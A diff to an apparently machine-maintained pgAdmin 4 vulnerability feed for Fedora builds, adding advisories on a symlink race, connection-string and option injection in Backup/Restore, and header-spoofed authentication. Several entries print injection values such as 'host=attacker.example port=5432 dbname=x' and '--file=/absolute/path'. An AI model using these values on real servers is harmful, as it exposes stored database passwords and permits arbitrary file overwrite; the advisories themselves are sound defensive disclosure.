@@ -183,7 +183,7 @@
                 "events": [
                     {
                         "introduced": "9.8-2.fc43",
-                        "fixed": "9.17-1.fc43",
+                        "fixed": "9.16-1.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -603,7 +603,7 @@
                 "events": [
                     {
                         "introduced": "9.8-2.fc43",
-                        "fixed": "9.14-2.fc43",
+                        "fixed": "9.14-3.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -656,7 +656,7 @@
                 "events": [
                     {
                         "introduced": "9.8-2.fc43",
-                        "fixed": "9.14-2.fc43",
+                        "fixed": "9.14-1.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -825,6 +825,102 @@
                         "introduced": "0",
                         "fixed": "9.15-1.fc44",
                         "identifier": "fc44"
+                    }
+                ]
+            },
+            "CVE-2026-86861": {
+                "cve_id": "CVE-2026-86861",
+                "title": "pgAdmin 4's File Manager save_file endpoint, which backs saving f ...",
+                "description": "pgAdmin 4's File Manager save_file endpoint, which backs saving from the Query Tool and ERD, validated the requested path with Filemanager.check_access_permission() and then opened the file for writing with a plain open() call. CVE-2026-7819 had previously hardened the separate file upload path by opening its target with O_NOFOLLOW, so that the kernel refuses to follow a symbolic link at the final path component, but save_file was left on an unprotected open(). A symbolic link already present when the check ran was rejected by the check itself; the remaining exposure was a link substituted at the final path component in the interval between the check and the write, at which point the write followed the link and landed outside the user's storage directory, creating or overwriting an arbitrary file as the operating-system account running pgAdmin.\n\nExploitation requires the ability to create or replace a symbolic link inside the requesting user's storage directory. pgAdmin exposes no interface that creates symbolic links, so this requires filesystem access to the pgAdmin host or to a shared or network-mounted storage backend, together with winning the timing window. The reporter did not achieve a write against a released version, having attempted approximately 63,000 racing requests without success; the reported defect is the uncovered write path rather than a demonstrated sandbox escape.\n\nThe fix routes save_file's write through the same O_NOFOLLOW-protected helper already used by the upload path, so both File Manager write sinks carry identical kernel-enforced protection, and reports a symbolic-link refusal explicitly instead of surfacing the underlying system error text. Note that files created by save_file are now given mode 0600, inheriting the behaviour introduced for uploads. The protection covers the final path component; substitution of an intermediate directory component is not addressed by this change.\n\nThis issue affects pgAdmin 4: from the introduction of the containment check in the File Manager save path before 9.18.",
+                "severity": "MEDIUM",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-86862": {
+                "cve_id": "CVE-2026-86862",
+                "title": "pgAdmin 4's Restore and Maintenance tools passed the client-suppl ...",
+                "description": "pgAdmin 4's Restore and Maintenance tools passed the client-supplied 'database' field directly as the value of the --dbname option given to pg_restore and psql. libpq expands a database name containing an equals sign into a full connection string, and connection keywords embedded in that value take precedence over the --host and --port arguments that pgAdmin supplies. A value such as 'host=attacker.example port=5432 dbname=x' therefore redirected the utility to a server chosen by the requesting user rather than the server the operation was invoked against. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection presents that credential to the attacker-nominated endpoint, which may capture it. The redirection additionally permits outbound connections from the pgAdmin host to arbitrary network addresses, including hosts not otherwise reachable by the requesting user.\n\nThe behaviour is reachable by any authenticated user holding the tools_restore or tools_maintenance permission, both of which the default User role grants. The Maintenance tool was not affected in the earliest releases, where the value was wrapped by a quoting helper that incidentally prevented expansion; it became affected when that wrapper was removed.\n\nThe fix supplies the target database in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. Where pg_restore requires a --dbname argument to be present, an empty value is passed, which contains no equals sign and is therefore not expanded, while the real name is taken from the environment.\n\nThis issue affects pgAdmin 4: from the introduction of the --dbname argument in the Restore and Maintenance tools before 9.18.",
+                "severity": "MEDIUM",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-86863": {
+                "cve_id": "CVE-2026-86863",
+                "title": "pgAdmin 4's Webserver authentication source is intended to accept ...",
+                "description": "pgAdmin 4's Webserver authentication source is intended to accept an identity asserted by the web server or reverse proxy in front of pgAdmin, delivered through the WSGI/CGI environment. WebserverAuthentication.get_user() read config.WEBSERVER_REMOTE_USER from request.environ and, when that returned nothing, fell back to reading the same name directly from the inbound HTTP request headers via request.headers.get(). An inbound HTTP header is written by whoever sends the request, so any client able to reach pgAdmin could supply that header itself and be authenticated as any username it named, including an existing Administrator, without presenting a password or any other credential. The environment lookup could also be satisfied by a client-supplied header whenever WEBSERVER_REMOTE_USER was configured to an HTTP_-prefixed or hyphenated name such as HTTP_X_FORWARDED_USER or X-Forwarded-User, since WSGI servers place inbound headers into the environment under exactly those names. Deployments are affected only when 'webserver' is enabled in AUTHENTICATION_SOURCES.\n\nThe fix distinguishes a genuine CGI/WSGI variable from a header-derived one and implicitly trusts only the former. A header-asserted identity is now accepted only when the operator explicitly opts in via WEBSERVER_REMOTE_USER_FROM_HEADER, the request arrives from a peer listed in WEBSERVER_TRUSTED_PROXIES, and, when configured, a shared secret supplied in WEBSERVER_SHARED_SECRET_HEADER matches WEBSERVER_SHARED_SECRET under a constant-time comparison. The trusted-peer check deliberately reads the real socket peer address rather than request.remote_addr, because ProxyFix rewrites the latter from the client-controlled X-Forwarded-For header and would otherwise allow an attacker to claim to be the trusted proxy. As defence in depth, login() now refuses any account whose auth_source is not 'webserver', so a misconfigured trust gate cannot be used to assume an internal or LDAP account.\n\nThis issue affects pgAdmin 4: from 6.2 before 9.18.",
+                "severity": "CRITICAL",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-86864": {
+                "cve_id": "CVE-2026-86864",
+                "title": "pgAdmin 4's Backup tool appended the client-supplied 'database' f ...",
+                "description": "pgAdmin 4's Backup tool appended the client-supplied 'database' field from the /backup/job/<sid>/object request to the pg_dump argument vector as a bare trailing positional argument, without validation. Because pg_dump parses its options with getopt_long, which permutes arguments, a value beginning with a dash was interpreted as an option rather than as a database name. A value such as --file=/absolute/path therefore overrode the storage-confined --file that pgAdmin had constructed earlier, causing pg_dump to write its output anywhere the pgAdmin process could write, outside the user's File Manager storage directory. This yields arbitrary file creation and overwrite as the operating-system account running pgAdmin, which can destroy pgAdmin's own configuration database and, depending on the target chosen, be escalated further.\n\nThe same field additionally permitted connection-string injection. libpq expands a database name containing an equals sign into a full connection string, and keywords embedded there override the --host and --port that pgAdmin passes, so a value such as 'host=attacker.example port=5432 dbname=x' redirected pg_dump to a server of the attacker's choosing. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection carries that credential to the attacker-nominated endpoint. Both behaviours are reachable by any authenticated user holding the tools_backup permission, which is granted to the default User role.\n\nThe fix stops passing the database name through the argument vector altogether and supplies it in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. This matches the approach already used by the Import/Export tool. Regression tests assert that the database name is absent from the constructed argument vector and that PGDATABASE carries the exact requested value.\n\nThis issue affects pgAdmin 4: from the introduction of the trailing positional database argument in the Backup tool before 9.18.",
+                "severity": "HIGH",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
                     }
                 ]
             }
@@ -1011,7 +1107,7 @@
                 "events": [
                     {
                         "introduced": "9.8-2.fc43",
-                        "fixed": "9.17-1.fc43",
+                        "fixed": "9.16-1.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1431,7 +1527,7 @@
                 "events": [
                     {
                         "introduced": "9.8-2.fc43",
-                        "fixed": "9.14-2.fc43",
+                        "fixed": "9.14-3.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1484,7 +1580,7 @@
                 "events": [
                     {
                         "introduced": "9.8-2.fc43",
-                        "fixed": "9.14-2.fc43",
+                        "fixed": "9.14-1.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1653,6 +1749,102 @@
                         "introduced": "0",
                         "fixed": "9.15-1.fc44",
                         "identifier": "fc44"
+                    }
+                ]
+            },
+            "CVE-2026-86861": {
+                "cve_id": "CVE-2026-86861",
+                "title": "pgAdmin 4's File Manager save_file endpoint, which backs saving f ...",
+                "description": "pgAdmin 4's File Manager save_file endpoint, which backs saving from the Query Tool and ERD, validated the requested path with Filemanager.check_access_permission() and then opened the file for writing with a plain open() call. CVE-2026-7819 had previously hardened the separate file upload path by opening its target with O_NOFOLLOW, so that the kernel refuses to follow a symbolic link at the final path component, but save_file was left on an unprotected open(). A symbolic link already present when the check ran was rejected by the check itself; the remaining exposure was a link substituted at the final path component in the interval between the check and the write, at which point the write followed the link and landed outside the user's storage directory, creating or overwriting an arbitrary file as the operating-system account running pgAdmin.\n\nExploitation requires the ability to create or replace a symbolic link inside the requesting user's storage directory. pgAdmin exposes no interface that creates symbolic links, so this requires filesystem access to the pgAdmin host or to a shared or network-mounted storage backend, together with winning the timing window. The reporter did not achieve a write against a released version, having attempted approximately 63,000 racing requests without success; the reported defect is the uncovered write path rather than a demonstrated sandbox escape.\n\nThe fix routes save_file's write through the same O_NOFOLLOW-protected helper already used by the upload path, so both File Manager write sinks carry identical kernel-enforced protection, and reports a symbolic-link refusal explicitly instead of surfacing the underlying system error text. Note that files created by save_file are now given mode 0600, inheriting the behaviour introduced for uploads. The protection covers the final path component; substitution of an intermediate directory component is not addressed by this change.\n\nThis issue affects pgAdmin 4: from the introduction of the containment check in the File Manager save path before 9.18.",
+                "severity": "MEDIUM",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-86862": {
+                "cve_id": "CVE-2026-86862",
+                "title": "pgAdmin 4's Restore and Maintenance tools passed the client-suppl ...",
+                "description": "pgAdmin 4's Restore and Maintenance tools passed the client-supplied 'database' field directly as the value of the --dbname option given to pg_restore and psql. libpq expands a database name containing an equals sign into a full connection string, and connection keywords embedded in that value take precedence over the --host and --port arguments that pgAdmin supplies. A value such as 'host=attacker.example port=5432 dbname=x' therefore redirected the utility to a server chosen by the requesting user rather than the server the operation was invoked against. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection presents that credential to the attacker-nominated endpoint, which may capture it. The redirection additionally permits outbound connections from the pgAdmin host to arbitrary network addresses, including hosts not otherwise reachable by the requesting user.\n\nThe behaviour is reachable by any authenticated user holding the tools_restore or tools_maintenance permission, both of which the default User role grants. The Maintenance tool was not affected in the earliest releases, where the value was wrapped by a quoting helper that incidentally prevented expansion; it became affected when that wrapper was removed.\n\nThe fix supplies the target database in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. Where pg_restore requires a --dbname argument to be present, an empty value is passed, which contains no equals sign and is therefore not expanded, while the real name is taken from the environment.\n\nThis issue affects pgAdmin 4: from the introduction of the --dbname argument in the Restore and Maintenance tools before 9.18.",
+                "severity": "MEDIUM",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-86863": {
+                "cve_id": "CVE-2026-86863",
+                "title": "pgAdmin 4's Webserver authentication source is intended to accept ...",
+                "description": "pgAdmin 4's Webserver authentication source is intended to accept an identity asserted by the web server or reverse proxy in front of pgAdmin, delivered through the WSGI/CGI environment. WebserverAuthentication.get_user() read config.WEBSERVER_REMOTE_USER from request.environ and, when that returned nothing, fell back to reading the same name directly from the inbound HTTP request headers via request.headers.get(). An inbound HTTP header is written by whoever sends the request, so any client able to reach pgAdmin could supply that header itself and be authenticated as any username it named, including an existing Administrator, without presenting a password or any other credential. The environment lookup could also be satisfied by a client-supplied header whenever WEBSERVER_REMOTE_USER was configured to an HTTP_-prefixed or hyphenated name such as HTTP_X_FORWARDED_USER or X-Forwarded-User, since WSGI servers place inbound headers into the environment under exactly those names. Deployments are affected only when 'webserver' is enabled in AUTHENTICATION_SOURCES.\n\nThe fix distinguishes a genuine CGI/WSGI variable from a header-derived one and implicitly trusts only the former. A header-asserted identity is now accepted only when the operator explicitly opts in via WEBSERVER_REMOTE_USER_FROM_HEADER, the request arrives from a peer listed in WEBSERVER_TRUSTED_PROXIES, and, when configured, a shared secret supplied in WEBSERVER_SHARED_SECRET_HEADER matches WEBSERVER_SHARED_SECRET under a constant-time comparison. The trusted-peer check deliberately reads the real socket peer address rather than request.remote_addr, because ProxyFix rewrites the latter from the client-controlled X-Forwarded-For header and would otherwise allow an attacker to claim to be the trusted proxy. As defence in depth, login() now refuses any account whose auth_source is not 'webserver', so a misconfigured trust gate cannot be used to assume an internal or LDAP account.\n\nThis issue affects pgAdmin 4: from 6.2 before 9.18.",
+                "severity": "CRITICAL",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-86864": {
+                "cve_id": "CVE-2026-86864",
+                "title": "pgAdmin 4's Backup tool appended the client-supplied 'database' f ...",
+                "description": "pgAdmin 4's Backup tool appended the client-supplied 'database' field from the /backup/job/<sid>/object request to the pg_dump argument vector as a bare trailing positional argument, without validation. Because pg_dump parses its options with getopt_long, which permutes arguments, a value beginning with a dash was interpreted as an option rather than as a database name. A value such as --file=/absolute/path therefore overrode the storage-confined --file that pgAdmin had constructed earlier, causing pg_dump to write its output anywhere the pgAdmin process could write, outside the user's File Manager storage directory. This yields arbitrary file creation and overwrite as the operating-system account running pgAdmin, which can destroy pgAdmin's own configuration database and, depending on the target chosen, be escalated further.\n\nThe same field additionally permitted connection-string injection. libpq expands a database name containing an equals sign into a full connection string, and keywords embedded there override the --host and --port that pgAdmin passes, so a value such as 'host=attacker.example port=5432 dbname=x' redirected pg_dump to a server of the attacker's choosing. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection carries that credential to the attacker-nominated endpoint. Both behaviours are reachable by any authenticated user holding the tools_backup permission, which is granted to the default User role.\n\nThe fix stops passing the database name through the argument vector altogether and supplies it in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. This matches the approach already used by the Import/Export tool. Regression tests assert that the database name is absent from the constructed argument vector and that PGDATABASE carries the exact requested value.\n\nThis issue affects pgAdmin 4: from the introduction of the trailing positional database argument in the Backup tool before 9.18.",
+                "severity": "HIGH",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
                     }
                 ]
             }
@@ -1839,7 +2031,7 @@
                 "events": [
                     {
                         "introduced": "9.8-2.fc43",
-                        "fixed": "9.17-1.fc43",
+                        "fixed": "9.16-1.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -2259,7 +2451,7 @@
                 "events": [
                     {
                         "introduced": "9.8-2.fc43",
-                        "fixed": "9.14-2.fc43",
+                        "fixed": "9.14-3.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -2312,7 +2504,7 @@
                 "events": [
                     {
                         "introduced": "9.8-2.fc43",
-                        "fixed": "9.14-2.fc43",
+                        "fixed": "9.14-1.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -2481,6 +2673,102 @@
                         "introduced": "0",
                         "fixed": "9.15-1.fc44",
                         "identifier": "fc44"
+                    }
+                ]
+            },
+            "CVE-2026-86861": {
+                "cve_id": "CVE-2026-86861",
+                "title": "pgAdmin 4's File Manager save_file endpoint, which backs saving f ...",
+                "description": "pgAdmin 4's File Manager save_file endpoint, which backs saving from the Query Tool and ERD, validated the requested path with Filemanager.check_access_permission() and then opened the file for writing with a plain open() call. CVE-2026-7819 had previously hardened the separate file upload path by opening its target with O_NOFOLLOW, so that the kernel refuses to follow a symbolic link at the final path component, but save_file was left on an unprotected open(). A symbolic link already present when the check ran was rejected by the check itself; the remaining exposure was a link substituted at the final path component in the interval between the check and the write, at which point the write followed the link and landed outside the user's storage directory, creating or overwriting an arbitrary file as the operating-system account running pgAdmin.\n\nExploitation requires the ability to create or replace a symbolic link inside the requesting user's storage directory. pgAdmin exposes no interface that creates symbolic links, so this requires filesystem access to the pgAdmin host or to a shared or network-mounted storage backend, together with winning the timing window. The reporter did not achieve a write against a released version, having attempted approximately 63,000 racing requests without success; the reported defect is the uncovered write path rather than a demonstrated sandbox escape.\n\nThe fix routes save_file's write through the same O_NOFOLLOW-protected helper already used by the upload path, so both File Manager write sinks carry identical kernel-enforced protection, and reports a symbolic-link refusal explicitly instead of surfacing the underlying system error text. Note that files created by save_file are now given mode 0600, inheriting the behaviour introduced for uploads. The protection covers the final path component; substitution of an intermediate directory component is not addressed by this change.\n\nThis issue affects pgAdmin 4: from the introduction of the containment check in the File Manager save path before 9.18.",
+                "severity": "MEDIUM",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-86862": {
+                "cve_id": "CVE-2026-86862",
+                "title": "pgAdmin 4's Restore and Maintenance tools passed the client-suppl ...",
+                "description": "pgAdmin 4's Restore and Maintenance tools passed the client-supplied 'database' field directly as the value of the --dbname option given to pg_restore and psql. libpq expands a database name containing an equals sign into a full connection string, and connection keywords embedded in that value take precedence over the --host and --port arguments that pgAdmin supplies. A value such as 'host=attacker.example port=5432 dbname=x' therefore redirected the utility to a server chosen by the requesting user rather than the server the operation was invoked against. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection presents that credential to the attacker-nominated endpoint, which may capture it. The redirection additionally permits outbound connections from the pgAdmin host to arbitrary network addresses, including hosts not otherwise reachable by the requesting user.\n\nThe behaviour is reachable by any authenticated user holding the tools_restore or tools_maintenance permission, both of which the default User role grants. The Maintenance tool was not affected in the earliest releases, where the value was wrapped by a quoting helper that incidentally prevented expansion; it became affected when that wrapper was removed.\n\nThe fix supplies the target database in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. Where pg_restore requires a --dbname argument to be present, an empty value is passed, which contains no equals sign and is therefore not expanded, while the real name is taken from the environment.\n\nThis issue affects pgAdmin 4: from the introduction of the --dbname argument in the Restore and Maintenance tools before 9.18.",
+                "severity": "MEDIUM",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-86863": {
+                "cve_id": "CVE-2026-86863",
+                "title": "pgAdmin 4's Webserver authentication source is intended to accept ...",
+                "description": "pgAdmin 4's Webserver authentication source is intended to accept an identity asserted by the web server or reverse proxy in front of pgAdmin, delivered through the WSGI/CGI environment. WebserverAuthentication.get_user() read config.WEBSERVER_REMOTE_USER from request.environ and, when that returned nothing, fell back to reading the same name directly from the inbound HTTP request headers via request.headers.get(). An inbound HTTP header is written by whoever sends the request, so any client able to reach pgAdmin could supply that header itself and be authenticated as any username it named, including an existing Administrator, without presenting a password or any other credential. The environment lookup could also be satisfied by a client-supplied header whenever WEBSERVER_REMOTE_USER was configured to an HTTP_-prefixed or hyphenated name such as HTTP_X_FORWARDED_USER or X-Forwarded-User, since WSGI servers place inbound headers into the environment under exactly those names. Deployments are affected only when 'webserver' is enabled in AUTHENTICATION_SOURCES.\n\nThe fix distinguishes a genuine CGI/WSGI variable from a header-derived one and implicitly trusts only the former. A header-asserted identity is now accepted only when the operator explicitly opts in via WEBSERVER_REMOTE_USER_FROM_HEADER, the request arrives from a peer listed in WEBSERVER_TRUSTED_PROXIES, and, when configured, a shared secret supplied in WEBSERVER_SHARED_SECRET_HEADER matches WEBSERVER_SHARED_SECRET under a constant-time comparison. The trusted-peer check deliberately reads the real socket peer address rather than request.remote_addr, because ProxyFix rewrites the latter from the client-controlled X-Forwarded-For header and would otherwise allow an attacker to claim to be the trusted proxy. As defence in depth, login() now refuses any account whose auth_source is not 'webserver', so a misconfigured trust gate cannot be used to assume an internal or LDAP account.\n\nThis issue affects pgAdmin 4: from 6.2 before 9.18.",
+                "severity": "CRITICAL",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-86864": {
+                "cve_id": "CVE-2026-86864",
+                "title": "pgAdmin 4's Backup tool appended the client-supplied 'database' f ...",
+                "description": "pgAdmin 4's Backup tool appended the client-supplied 'database' field from the /backup/job/<sid>/object request to the pg_dump argument vector as a bare trailing positional argument, without validation. Because pg_dump parses its options with getopt_long, which permutes arguments, a value beginning with a dash was interpreted as an option rather than as a database name. A value such as --file=/absolute/path therefore overrode the storage-confined --file that pgAdmin had constructed earlier, causing pg_dump to write its output anywhere the pgAdmin process could write, outside the user's File Manager storage directory. This yields arbitrary file creation and overwrite as the operating-system account running pgAdmin, which can destroy pgAdmin's own configuration database and, depending on the target chosen, be escalated further.\n\nThe same field additionally permitted connection-string injection. libpq expands a database name containing an equals sign into a full connection string, and keywords embedded there override the --host and --port that pgAdmin passes, so a value such as 'host=attacker.example port=5432 dbname=x' redirected pg_dump to a server of the attacker's choosing. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection carries that credential to the attacker-nominated endpoint. Both behaviours are reachable by any authenticated user holding the tools_backup permission, which is granted to the default User role.\n\nThe fix stops passing the database name through the argument vector altogether and supplies it in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. This matches the approach already used by the Import/Export tool. Regression tests assert that the database name is absent from the constructed argument vector and that PGDATABASE carries the exact requested value.\n\nThis issue affects pgAdmin 4: from the introduction of the trailing positional database argument in the Backup tool before 9.18.",
+                "severity": "HIGH",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "9.8-2.fc43",
+                        "fixed": "9.18-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "9.18-1.fc45",
+                        "identifier": "fc45"
                     }
                 ]
             }
